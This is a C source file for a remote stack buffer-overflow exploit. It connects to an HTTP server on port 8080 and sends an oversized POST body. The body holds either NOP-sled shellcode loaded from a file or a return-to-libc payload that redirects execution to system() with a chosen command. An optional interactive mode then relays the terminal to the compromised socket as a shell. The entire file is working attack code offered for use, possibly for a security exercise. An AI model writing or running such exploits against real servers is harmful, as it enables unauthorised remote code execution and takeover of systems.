#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <ctype.h>
#include <errno.h>
#include <netdb.h>
#include <stdlib.h>
#include <sys/epoll.h>

#define MAX_BUFFER 500
#define MAX_EVENTS 10
#define HTTP_PORT 8080
#define BACKLOG 20

static inline unsigned long long system_addr(void)
{
    return (unsigned long long)(void *)system;
}

int connect_client(char *server_name)
{
    struct sockaddr_in server_address;
    int server;
    struct hostent *server_host;
    server_host = gethostbyname(server_name);
    if (!server_host) {
        fprintf(stderr, "no such server: %s\n", server_name);
    }
    memset(&server_address, 0, sizeof(server_address));
    server_address.sin_family = AF_INET;
    server_address.sin_port = htons(HTTP_PORT);
    memcpy(&server_address.sin_addr.s_addr, server_host->h_addr,
           server_host->h_length);

    server = socket(AF_INET, SOCK_STREAM, 0);
    if (server < 0) {
        return server;
    }

    if (connect(server, (struct sockaddr*)&server_address,
                sizeof(server_address)) < 0) {
        return -1;
    }

    return server;
}

void get_code(char *file, char *buffer, unsigned int buffsize,
              unsigned int *code_size)
{
    struct stat st_data;
    int shellcode = open(file, O_RDONLY);
    if (shellcode < 0) {
        perror("open");
        abort();
    }

    if (stat(file, &st_data) < 0) {
        perror("stat");
        abort();
    }

    if (st_data.st_size > buffsize) {
        fprintf(stderr, "shellcode too big.\n");
        abort();
    }

    if (read(shellcode, buffer, st_data.st_size) != st_data.st_size) {
        perror("read");
        abort();
    }

    *code_size = st_data.st_size;

}

void crack_it_return_libc(int client, char *command, unsigned int offset,
                          unsigned int offset_return)
{
    unsigned int buffsize = MAX_BUFFER + offset_return + sizeof(void *) * 3;
    char *buffer = malloc(buffsize);
    unsigned long long address = (unsigned long long)&buffsize - offset;
    size_t cmd_length = strlen(command);
    char buffsend[100];

    if (!buffer) {
        perror("malloc");
        abort();
    }

    address += MAX_BUFFER - cmd_length; // the offset must get the correct addr

    unsigned long long *retbuff = (unsigned long long *)(buffer +
            offset_return);

    printf("%llx\n", address);
    retbuff[0] = system_addr();
    retbuff[1] = 0xDEADBEEF15DEAD00ULL; //return address doesn't matter
    retbuff[2] = address; // address of first argument
    
    memset(buffer, 0x90, MAX_BUFFER); // the contents doesn't matter
    memcpy(buffer + MAX_BUFFER - cmd_length, command, cmd_length);

    sprintf(buffsend, "POST / HTTP/1.1\r\nContent-Length: %u\r\n\r\n",
            buffsize + 5);
    write(client, buffsend, strlen(buffsend));
    write(client, "data=", 5);
    write(client, buffer, buffsize);
    free(buffer);    
}

void crack_it_exec_stack(int client, char *code_file, unsigned int offset)
{
    int i;
    unsigned int buffsize = MAX_BUFFER + 24;
    unsigned long long address = (unsigned long long)&i - offset;
    char *buffer = malloc(buffsize);
    char buffsend[100];
    unsigned int code_size;
    char code[MAX_BUFFER / 2];

    if (!buffer) {
        perror("malloc");
        exit(EXIT_FAILURE);
    }
    get_code(code_file, code, MAX_BUFFER / 2, &code_size);
    printf("%llx\n", address);
    for (i = 19; i < buffsize; i += sizeof(void *)) {
        *((unsigned long long *)(buffer + i)) = address;
    }
    memset(buffer, 0x90, MAX_BUFFER / 2);
    memcpy(buffer + MAX_BUFFER / 2, code, code_size);

    sprintf(buffsend, "POST / HTTP/1.1\r\nContent-Length: %u\r\n\r\n",
            buffsize + 5);
    write(client, buffsend, strlen(buffsend));
    write(client, "data=", 5);
    write(client, buffer, buffsize);
    free(buffer);
}

void make_non_block(int fd)
{
    int flags = fcntl(fd, F_GETFL, 0);
    if (flags < 0) {
        perror("fcntl get");
        abort();
    }

    flags |= O_NONBLOCK;
    
    if (fcntl(fd, F_SETFL, flags) < 0) {
        perror("fcntl set");
        abort();
    }
}

void interactive(int client)
{
    struct epoll_event event, *events;
    int efd;
    events = calloc(MAX_EVENTS, sizeof(event));
    make_non_block(client);
    make_non_block(STDIN_FILENO);
    if (!events) {
        perror("calloc");
        abort();
    }
    efd = epoll_create1(0);
    if (efd < 0) {
        perror("epoll_create1");
        abort();
    }
    event.data.fd = client;
    event.events = EPOLLIN | EPOLLET;
    if (epoll_ctl(efd, EPOLL_CTL_ADD, client, &event) < 0) {
        perror("epoll_ctl client");
        abort();
    }
    
    event.data.fd = STDIN_FILENO;
    event.events = EPOLLIN | EPOLLET;
    if (epoll_ctl(efd, EPOLL_CTL_ADD, STDIN_FILENO, &event) < 0) {
        perror("epoll stdin");
        abort();
    }

    while (1) {
        int i;
        char buffer[MAX_BUFFER];
        int n_events = epoll_wait(efd, events, MAX_EVENTS, -1);
        /* main interactive loop */
        for (i = 0; i < n_events; i++) {
            int done = 0;
            if ((events[i].events & EPOLLERR) ||
                (events[i].events & EPOLLHUP) ||
                (!(events[i].events & EPOLLIN))) {
                perror("epoll_wait");
                abort();
            }

            while (!done) {
                int count = read(events[i].data.fd, buffer, MAX_BUFFER);
                if (count < 0) {
                    if (errno != EAGAIN) {
                        perror("read");
                        abort();
                    }
                    done = 1;
                } else if (count == 0) {
                    goto do_exit;
                } else {
                    int out = events[i].data.fd == client ? STDOUT_FILENO :
                                                            client;
                    write(out, buffer, count);
                }
            }
        }
    }
do_exit:
    close(efd);
}


int main(int argc, char **argv)
{
    int client;
    if (argc != 4 && argc != 5) {
        fprintf(stderr, "usage: %s server shellcode|command offset off_addr\n",
                argv[0]);
        return EXIT_FAILURE;
    }
    client = connect_client(argv[1]);
    if (argc == 4) {
        crack_it_exec_stack(client, argv[2], 
                            (unsigned)strtoul(argv[3], NULL, 0));
#ifdef INTERACTIVE
        interactive(client);
#endif
    } else {
        crack_it_return_libc(client, argv[2],
                             (unsigned)strtoul(argv[3], NULL, 0),
                             (unsigned)strtoul(argv[4], NULL, 0));
    }
    return 0;
}

